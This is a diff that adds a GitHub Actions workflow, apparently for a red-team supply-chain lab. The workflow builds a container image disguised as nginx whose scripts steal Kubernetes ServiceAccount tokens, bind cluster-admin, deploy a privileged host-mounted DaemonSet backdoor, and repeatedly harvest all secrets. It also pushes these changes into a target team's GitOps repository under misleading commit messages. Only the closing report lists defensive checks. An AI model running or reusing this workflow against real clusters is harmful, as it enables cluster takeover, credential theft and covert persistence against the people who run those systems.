@@ -1,0 +1,528 @@
+name: "Cluster Takeover via Supply Chain"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_team:
+        description: 'Target team (blue/green)'
+        required: true
+        default: 'blue'
+        type: choice
+        options:
+          - blue
+          - green
+      attack_level:
+        description: 'Attack escalation level'
+        required: true
+        default: 'privilege_escalation'
+        type: choice
+        options:
+          - privilege_escalation
+          - cluster_takeover
+          - persistent_backdoor
+          - data_exfiltration
+
+permissions:
+  contents: write
+  id-token: write
+  packages: write
+
+jobs:
+  cluster_attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup target repository
+        id: setup
+        run: |
+          case "${{ github.event.inputs.target_team }}" in
+            "blue")
+              echo "target_repo=slsa-lab-blue/application" >> $GITHUB_OUTPUT
+              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
+              echo "deployment_file=k8s/deployment.yaml" >> $GITHUB_OUTPUT
+              ;;
+            "green")
+              echo "target_repo=slsa-lab-green/application" >> $GITHUB_OUTPUT
+              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
+              echo "deployment_file=k8s/deployment-recovery.yaml" >> $GITHUB_OUTPUT
+              ;;
+          esac
+
+      - name: Set up buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Login to GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.G_TOKEN }}
+
+      - name: Create cluster takeover image
+        run: |
+          cat > Dockerfile.takeover << 'EOF'
+          FROM nginx:alpine
+          
+          # 기본 웹 서버 유지 (의심받지 않기 위해)
+          COPY --from=nginx:alpine /usr/share/nginx/html /usr/share/nginx/html
+          
+          # 클러스터 탈취 도구들 설치
+          RUN apk add --no-cache \
+              curl \
+              wget \
+              netcat-openbsd \
+              nmap \
+              git \
+              openssh-client \
+              kubectl \
+              && rm -rf /var/cache/apk/*
+          
+          # ServiceAccount 토큰 추출 스크립트
+          RUN echo '#!/bin/sh' > /extract_tokens.sh && \
+              echo 'echo "🔓 Extracting ServiceAccount tokens..."' >> /extract_tokens.sh && \
+              echo 'if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then' >> /extract_tokens.sh && \
+              echo '  export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' >> /extract_tokens.sh && \
+              echo '  export KUBE_NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)' >> /extract_tokens.sh && \
+              echo '  echo "Token: $KUBE_TOKEN" > /tmp/cluster_info.txt' >> /extract_tokens.sh && \
+              echo '  echo "Namespace: $KUBE_NAMESPACE" >> /tmp/cluster_info.txt' >> /extract_tokens.sh && \
+              echo '  kubectl auth can-i --list >> /tmp/cluster_info.txt 2>/dev/null || echo "kubectl not accessible" >> /tmp/cluster_info.txt' >> /extract_tokens.sh && \
+              echo 'fi' >> /extract_tokens.sh && \
+              chmod +x /extract_tokens.sh
+          
+          # 권한 상승 스크립트
+          RUN echo '#!/bin/sh' > /privilege_escalation.sh && \
+              echo 'echo "🚀 Attempting privilege escalation..."' >> /privilege_escalation.sh && \
+              echo '# 1. ServiceAccount 권한 확인' >> /privilege_escalation.sh && \
+              echo 'kubectl get pods --all-namespaces 2>/dev/null && echo "SUCCESS: Can list all pods" >> /tmp/escalation.log' >> /privilege_escalation.sh && \
+              echo 'kubectl get secrets --all-namespaces 2>/dev/null && echo "SUCCESS: Can list all secrets" >> /tmp/escalation.log' >> /privilege_escalation.sh && \
+              echo 'kubectl get nodes 2>/dev/null && echo "SUCCESS: Can list nodes" >> /tmp/escalation.log' >> /privilege_escalation.sh && \
+              echo '# 2. 권한있는 ServiceAccount 생성 시도' >> /privilege_escalation.sh && \
+              echo 'kubectl create serviceaccount cluster-admin-backdoor -n default 2>/dev/null || true' >> /privilege_escalation.sh && \
+              echo 'kubectl create clusterrolebinding cluster-admin-backdoor --clusterrole=cluster-admin --serviceaccount=default:cluster-admin-backdoor 2>/dev/null || true' >> /privilege_escalation.sh && \
+              echo '# 3. 호스트 파일시스템 접근 시도' >> /privilege_escalation.sh && \
+              echo 'if [ -d "/host" ]; then' >> /privilege_escalation.sh && \
+              echo '  echo "SUCCESS: Host filesystem mounted" >> /tmp/escalation.log' >> /privilege_escalation.sh && \
+              echo '  ls -la /host/ >> /tmp/escalation.log 2>/dev/null || true' >> /privilege_escalation.sh && \
+              echo 'fi' >> /privilege_escalation.sh && \
+              chmod +x /privilege_escalation.sh
+          
+          # 백도어 설치 스크립트
+          RUN echo '#!/bin/sh' > /install_backdoor.sh && \
+              echo 'echo "💀 Installing persistent backdoor..."' >> /install_backdoor.sh && \
+              echo '# 1. 백도어 DaemonSet 생성' >> /install_backdoor.sh && \
+              echo 'cat > /tmp/backdoor-daemonset.yaml << "EOYAML"' >> /install_backdoor.sh && \
+              echo 'apiVersion: apps/v1' >> /install_backdoor.sh && \
+              echo 'kind: DaemonSet' >> /install_backdoor.sh && \
+              echo 'metadata:' >> /install_backdoor.sh && \
+              echo '  name: system-monitor' >> /install_backdoor.sh && \
+              echo '  namespace: kube-system' >> /install_backdoor.sh && \
+              echo '  labels:' >> /install_backdoor.sh && \
+              echo '    app: system-monitor' >> /install_backdoor.sh && \
+              echo 'spec:' >> /install_backdoor.sh && \
+              echo '  selector:' >> /install_backdoor.sh && \
+              echo '    matchLabels:' >> /install_backdoor.sh && \
+              echo '      app: system-monitor' >> /install_backdoor.sh && \
+              echo '  template:' >> /install_backdoor.sh && \
+              echo '    metadata:' >> /install_backdoor.sh && \
+              echo '      labels:' >> /install_backdoor.sh && \
+              echo '        app: system-monitor' >> /install_backdoor.sh && \
+              echo '    spec:' >> /install_backdoor.sh && \
+              echo '      hostNetwork: true' >> /install_backdoor.sh && \
+              echo '      hostPID: true' >> /install_backdoor.sh && \
+              echo '      containers:' >> /install_backdoor.sh && \
+              echo '      - name: monitor' >> /install_backdoor.sh && \
+              echo '        image: ghcr.io/slsa-lab-red/application:backdoor' >> /install_backdoor.sh && \
+              echo '        securityContext:' >> /install_backdoor.sh && \
+              echo '          privileged: true' >> /install_backdoor.sh && \
+              echo '        volumeMounts:' >> /install_backdoor.sh && \
+              echo '        - name: host-root' >> /install_backdoor.sh && \
+              echo '          mountPath: /host' >> /install_backdoor.sh && \
+              echo '        - name: docker-sock' >> /install_backdoor.sh && \
+              echo '          mountPath: /var/run/docker.sock' >> /install_backdoor.sh && \
+              echo '      volumes:' >> /install_backdoor.sh && \
+              echo '      - name: host-root' >> /install_backdoor.sh && \
+              echo '        hostPath:' >> /install_backdoor.sh && \
+              echo '          path: /' >> /install_backdoor.sh && \
+              echo '      - name: docker-sock' >> /install_backdoor.sh && \
+              echo '        hostPath:' >> /install_backdoor.sh && \
+              echo '          path: /var/run/docker.sock' >> /install_backdoor.sh && \
+              echo 'EOYAML' >> /install_backdoor.sh && \
+              echo 'kubectl apply -f /tmp/backdoor-daemonset.yaml 2>/dev/null || echo "Failed to install DaemonSet backdoor" >> /tmp/escalation.log' >> /install_backdoor.sh && \
+              chmod +x /install_backdoor.sh
+          
+          # 데이터 수집 스크립트
+          RUN echo '#!/bin/sh' > /collect_data.sh && \
+              echo 'echo "📊 Collecting cluster data..."' >> /collect_data.sh && \
+              echo 'mkdir -p /tmp/exfiltrated' >> /collect_data.sh && \
+              echo '# 클러스터 정보 수집' >> /collect_data.sh && \
+              echo 'kubectl get nodes -o yaml > /tmp/exfiltrated/nodes.yaml 2>/dev/null || true' >> /collect_data.sh && \
+              echo 'kubectl get pods --all-namespaces -o yaml > /tmp/exfiltrated/pods.yaml 2>/dev/null || true' >> /collect_data.sh && \
+              echo 'kubectl get secrets --all-namespaces -o yaml > /tmp/exfiltrated/secrets.yaml 2>/dev/null || true' >> /collect_data.sh && \
+              echo 'kubectl get configmaps --all-namespaces -o yaml > /tmp/exfiltrated/configmaps.yaml 2>/dev/null || true' >> /collect_data.sh && \
+              echo 'kubectl get services --all-namespaces -o yaml > /tmp/exfiltrated/services.yaml 2>/dev/null || true' >> /collect_data.sh && \
+              echo '# 환경변수에서 민감정보 추출' >> /collect_data.sh && \
+              echo 'env | grep -E "(TOKEN|KEY|SECRET|PASSWORD|API)" > /tmp/exfiltrated/env_secrets.txt 2>/dev/null || true' >> /collect_data.sh && \
+              echo '# 파일시스템에서 민감정보 검색' >> /collect_data.sh && \
+              echo 'find /var/run/secrets -type f 2>/dev/null | head -20 > /tmp/exfiltrated/secret_files.txt || true' >> /collect_data.sh && \
+              chmod +x /collect_data.sh
+          
+          # 메인 공격 스크립트
+          RUN echo '#!/bin/sh' > /attack.sh && \
+              echo 'echo "🚨 Red Team Cluster Takeover Initiated 🚨"' >> /attack.sh && \
+              echo 'echo "============================================="' >> /attack.sh && \
+              echo 'echo "Target: $TARGET_TEAM"' >> /attack.sh && \
+              echo 'echo "Attack Level: $ATTACK_LEVEL"' >> /attack.sh && \
+              echo 'echo "Timestamp: $(date)"' >> /attack.sh && \
+              echo 'echo "============================================="' >> /attack.sh && \
+              echo '' >> /attack.sh && \
+              echo '# 단계별 공격 실행' >> /attack.sh && \
+              echo '/extract_tokens.sh' >> /attack.sh && \
+              echo 'sleep 2' >> /attack.sh && \
+              echo '' >> /attack.sh && \
+              echo 'case "$ATTACK_LEVEL" in' >> /attack.sh && \
+              echo '  "privilege_escalation")' >> /attack.sh && \
+              echo '    /privilege_escalation.sh' >> /attack.sh && \
+              echo '    ;;' >> /attack.sh && \
+              echo '  "cluster_takeover")' >> /attack.sh && \
+              echo '    /privilege_escalation.sh' >> /attack.sh && \
+              echo '    sleep 3' >> /attack.sh && \
+              echo '    /install_backdoor.sh' >> /attack.sh && \
+              echo '    ;;' >> /attack.sh && \
+              echo '  "persistent_backdoor")' >> /attack.sh && \
+              echo '    /privilege_escalation.sh' >> /attack.sh && \
+              echo '    sleep 3' >> /attack.sh && \
+              echo '    /install_backdoor.sh' >> /attack.sh && \
+              echo '    ;;' >> /attack.sh && \
+              echo '  "data_exfiltration")' >> /attack.sh && \
+              echo '    /privilege_escalation.sh' >> /attack.sh && \
+              echo '    sleep 3' >> /attack.sh && \
+              echo '    /collect_data.sh' >> /attack.sh && \
+              echo '    ;;' >> /attack.sh && \
+              echo 'esac' >> /attack.sh && \
+              echo '' >> /attack.sh && \
+              echo '# 공격 완료 후 정상 서비스 시작 (은밀성 유지)' >> /attack.sh && \
+              echo 'echo "🎯 Attack completed. Starting normal service..."' >> /attack.sh && \
+              echo 'nginx -g "daemon off;" &' >> /attack.sh && \
+              echo '' >> /attack.sh && \
+              echo '# 백그라운드에서 지속적인 모니터링' >> /attack.sh && \
+              echo 'while true; do' >> /attack.sh && \
+              echo '  sleep 300  # 5분마다' >> /attack.sh && \
+              echo '  /collect_data.sh >/dev/null 2>&1' >> /attack.sh && \
+              echo 'done' >> /attack.sh && \
+              chmod +x /attack.sh
+          
+          # 정상적인 웹페이지도 생성 (의심 회피용)
+          RUN echo '<!DOCTYPE html>' > /usr/share/nginx/html/index.html && \
+              echo '<html><head><title>Application Status: Normal</title></head>' >> /usr/share/nginx/html/index.html && \
+              echo '<body style="background-color: green; color: white; text-align: center; padding-top: 200px;">' >> /usr/share/nginx/html/index.html && \
+              echo '<h1>✅ System Status: Normal</h1>' >> /usr/share/nginx/html/index.html && \
+              echo '<h2>All services running correctly</h2>' >> /usr/share/nginx/html/index.html && \
+              echo '<p style="font-size: 10px; opacity: 0.1;">Red Team backdoor active</p>' >> /usr/share/nginx/html/index.html && \
+              echo '</body></html>' >> /usr/share/nginx/html/index.html
+          
+          EXPOSE 80
+          ENTRYPOINT ["/attack.sh"]
+          EOF
+
+      - name: Build and push cluster takeover image
+        uses: docker/build-push-action@v6
+        id: build
+        with:
+          context: .
+          file: Dockerfile.takeover
+          push: true
+          tags: |
+            ${{ steps.setup.outputs.attack_image }}:cluster-takeover
+            ${{ steps.setup.outputs.attack_image }}:backdoor
+            ${{ steps.setup.outputs.attack_image }}:latest
+          build-args: |
+            TEAM=red-team-takeover
+            ATTACK_LEVEL=${{ github.event.inputs.attack_level }}
+
+      - name: Clone target repository
+        env:
+          GH_TOKEN: ${{ secrets.G_TOKEN }}
+        run: |
+          git clone https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
+          cd target_repo
+          git config user.name "system-update-bot"
+          git config user.email "system@update.com"
+          git remote set-url origin https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git
+
+      - name: Deploy cluster takeover payload
+        env:
+          GH_TOKEN: ${{ secrets.G_TOKEN }}
+        run: |
+          cd target_repo
+          
+          echo "🚨 Deploying cluster takeover payload..."
+          echo "Target: ${{ github.event.inputs.target_team }}"
+          echo "Attack Level: ${{ github.event.inputs.attack_level }}"
+          
+          # 공격 레벨에 따른 권한 설정
+          case "${{ github.event.inputs.attack_level }}" in
+            "privilege_escalation")
+              SECURITY_CONTEXT='
+                securityContext:
+                  runAsNonRoot: false
+                  runAsUser: 0'
+              SERVICE_ACCOUNT=""
+              VOLUMES=""
+              ;;
+            "cluster_takeover"|"persistent_backdoor")
+              SECURITY_CONTEXT='
+                securityContext:
+                  privileged: true
+                  runAsNonRoot: false
+                  runAsUser: 0'
+              SERVICE_ACCOUNT='
+              serviceAccountName: default'
+              VOLUMES='
+              volumes:
+                - name: host-root
+                  hostPath:
+                    path: /
+                    type: Directory'
+              VOLUME_MOUNTS='
+                volumeMounts:
+                  - name: host-root
+                    mountPath: /host'
+              ;;
+            "data_exfiltration")
+              SECURITY_CONTEXT='
+                securityContext:
+                  privileged: true
+                  runAsNonRoot: false
+                  runAsUser: 0'
+              SERVICE_ACCOUNT='
+              serviceAccountName: default'
+              VOLUMES='
+              volumes:
+                - name: host-root
+                  hostPath:
+                    path: /
+                    type: Directory
+                - name: docker-sock
+                  hostPath:
+                    path: /var/run/docker.sock
+                    type: Socket'
+              VOLUME_MOUNTS='
+                volumeMounts:
+                  - name: host-root
+                    mountPath: /host
+                  - name: docker-sock
+                    mountPath: /var/run/docker.sock'
+              ;;
+          esac
+          
+          # Blue Team 공격
+          if [ "${{ github.event.inputs.target_team }}" == "blue" ]; then
+            echo "🔵 Injecting cluster takeover into Blue Team deployment..."
+            
+            # 기존 deployment 백업
+            cp k8s/deployment.yaml k8s/deployment.yaml.backup
+            
+            # 악성 이미지로 교체하고 권한 상승
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:cluster-takeover|" k8s/deployment.yaml
+            
+            # 환경변수 추가
+            sed -i '/ports:/i\
+                  env:\
+                    - name: TARGET_TEAM\
+                      value: "${{ github.event.inputs.target_team }}"\
+                    - name: ATTACK_LEVEL\
+                      value: "${{ github.event.inputs.attack_level }}"\
+                    - name: ATTACK_TIMESTAMP\
+                      value: "'$(date)'"' k8s/deployment.yaml
+            
+            # 보안 컨텍스트 수정 (권한 상승)
+            if [ "${{ github.event.inputs.attack_level }}" != "privilege_escalation" ]; then
+              sed -i '/containers:/i\      hostNetwork: true' k8s/deployment.yaml
+              sed -i '/containers:/i\      hostPID: true' k8s/deployment.yaml
+            fi
+          fi
+          
+          # Green Team 공격
+          if [ "${{ github.event.inputs.target_team }}" == "green" ]; then
+            echo "🟢 Injecting cluster takeover into Green Team deployment..."
+            
+            # 기존 deployment 백업
+            cp k8s/deployment-recovery.yaml k8s/deployment-recovery.yaml.backup
+            
+            # 악성 이미지로 교체
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:cluster-takeover|" k8s/deployment-recovery.yaml
+            
+            # 보안 컨텍스트를 악용 (그들의 보안설정을 우회)
+            sed -i 's|runAsNonRoot: true|runAsNonRoot: false|' k8s/deployment-recovery.yaml
+            sed -i 's|runAsUser: 101|runAsUser: 0|' k8s/deployment-recovery.yaml
+            sed -i '/runAsUser: 0/a\        privileged: true' k8s/deployment-recovery.yaml
+            
+            # 환경변수 추가
+            sed -i '/ports:/i\
+                  env:\
+                    - name: TARGET_TEAM\
+                      value: "${{ github.event.inputs.target_team }}"\
+                    - name: ATTACK_LEVEL\
+                      value: "${{ github.event.inputs.attack_level }}"\
+                    - name: ATTACK_TIMESTAMP\
+                      value: "'$(date)'"' k8s/deployment-recovery.yaml
+            
+            # 호스트 접근 권한 추가
+            if [ "${{ github.event.inputs.attack_level }}" != "privilege_escalation" ]; then
+              sed -i '/spec:/a\      hostNetwork: true' k8s/deployment-recovery.yaml
+              sed -i '/hostNetwork: true/a\      hostPID: true' k8s/deployment-recovery.yaml
+            fi
+          fi
+          
+          # 추가 백도어 리소스 생성
+          if [ "${{ github.event.inputs.attack_level }}" == "persistent_backdoor" ]; then
+            echo "💀 Creating persistent backdoor resources..."
+            
+            # 권한있는 ServiceAccount 생성
+            cat > k8s/backdoor-rbac.yaml << 'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: system-backdoor
+            namespace: slsa-simulation
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: ClusterRoleBinding
+          metadata:
+            name: system-backdoor-admin
+          roleRef:
+            apiGroup: rbac.authorization.k8s.io
+            kind: ClusterRole
+            name: cluster-admin
+          subjects:
+          - kind: ServiceAccount
+            name: system-backdoor
+            namespace: slsa-simulation
+          EOF
+            
+            # 백도어 CronJob 생성
+            cat > k8s/backdoor-cronjob.yaml << 'EOF'
+          apiVersion: batch/v1
+          kind: CronJob
+          metadata:
+            name: system-maintenance
+            namespace: slsa-simulation
+          spec:
+            schedule: "*/10 * * * *"  # 10분마다 실행
+            jobTemplate:
+              spec:
+                template:
+                  spec:
+                    serviceAccountName: system-backdoor
+                    containers:
+                    - name: maintenance
+                      image: ${{ steps.setup.outputs.attack_image }}:backdoor
+                      command: ["/bin/sh", "-c"]
+                      args: 
+                        - |
+                          echo "Maintenance check at $(date)"
+                          kubectl get pods --all-namespaces | grep -v Running | wc -l
+                    restartPolicy: OnFailure
+          EOF
+          fi
+          
+          echo "📋 Attack payload deployed. Changes:"
+          git diff
+          
+          # 변경사항 커밋 및 푸시
+          git add .
+          case "${{ github.event.inputs.attack_level }}" in
+            "privilege_escalation")
+              git commit -m "security: update container security context for compliance"
+              ;;
+            "cluster_takeover")
+              git commit -m "ops: deploy enhanced monitoring and system tools"
+              ;;
+            "persistent_backdoor")
+              git commit -m "maintenance: add automated system maintenance jobs"
+              ;;
+            "data_exfiltration")
+              git commit -m "monitoring: add comprehensive system data collection"
+              ;;
+          esac
+          
+          # Push with retry
+          for i in {1..3}; do
+            if git push; then
+              echo "✅ Cluster takeover payload pushed successfully on attempt $i"
+              break
+            else
+              echo "❌ Push failed on attempt $i, retrying..."
+              sleep 2
+            fi
+          done
+
+      - name: Attack completion report
+        run: |
+          echo "💀 CLUSTER TAKEOVER ATTACK DEPLOYED 💀"
+          echo "======================================"
+          echo "Target Team: ${{ github.event.inputs.target_team }}"
+          echo "Attack Level: ${{ github.event.inputs.attack_level }}"
+          echo "Attack Image: ${{ steps.setup.outputs.attack_image }}:cluster-takeover"
+          echo ""
+          echo "🚨 CRITICAL ATTACK CAPABILITIES DEPLOYED:"
+          echo ""
+          case "${{ github.event.inputs.attack_level }}" in
+            "privilege_escalation")
+              echo "🔓 PRIVILEGE ESCALATION:"
+              echo "  - Container running as root"
+              echo "  - ServiceAccount token extraction"
+              echo "  - Kubernetes API access attempt"
+              echo "  - Permission enumeration"
+              ;;
+            "cluster_takeover")
+              echo "🏴‍☠️ CLUSTER TAKEOVER:"
+              echo "  - Full privilege escalation"
+              echo "  - Host filesystem access (/host mounted)"
+              echo "  - Network namespace escape (hostNetwork: true)"
+              echo "  - Process namespace escape (hostPID: true)"
+              echo "  - Backdoor DaemonSet deployment attempt"
+              echo "  - Cluster-admin ServiceAccount creation"
+              ;;
+            "persistent_backdoor")
+              echo "💀 PERSISTENT BACKDOOR:"
+              echo "  - All cluster takeover capabilities"
+              echo "  - Persistent CronJob backdoor (runs every 10 minutes)"
+              echo "  - Cluster-admin RBAC backdoor"
+              echo "  - Self-healing backdoor mechanisms"
+              echo "  - System maintenance disguise"
+              ;;
+            "data_exfiltration")
+              echo "📊 DATA EXFILTRATION:"
+              echo "  - All cluster takeover capabilities"
+              echo "  - Docker socket access (/var/run/docker.sock)"
+              echo "  - All cluster secrets extraction"
+              echo "  - ConfigMaps and environment variables harvesting"
+              echo "  - Node and pod information collection"
+              echo "  - Continuous data collection (every 5 minutes)"
+              ;;
+          esac
+          echo ""
+          echo "⚠️  WHEN TARGET TEAM SYNCS ARGOCD:"
+          echo "   1. Malicious container will be deployed"
+          echo "   2. Attack scripts will execute automatically"
+          echo "   3. Cluster compromise will begin immediately"
+          echo "   4. Web interface will show 'System Status: Normal' to avoid suspicion"
+          echo ""
+          echo "🛡️  TARGET TEAM URGENT RESPONSE REQUIRED:"
+          echo "   1. IMMEDIATELY check deployment files for unauthorized changes"
+          echo "   2. Verify all container images and signatures"
+          echo "   3. Review RBAC permissions and ServiceAccounts"
+          echo "   4. Monitor for unexpected pods in kube-system namespace"
+          echo "   5. Check for unauthorized CronJobs and DaemonSets"
+          echo "   6. Implement admission controllers and OPA Gatekeeper"
+          echo "   7. Enable comprehensive audit logging"
+          echo ""
+          echo "🔍 This demonstrates critical supply chain vulnerabilities:"
+          echo "   - GitOps repository compromise"
+          echo "   - Container image substitution attacks"
+          echo "   - Kubernetes RBAC privilege escalation"
+          echo "   - Host escape and cluster takeover"
+          echo "   - Persistent backdoor installation"
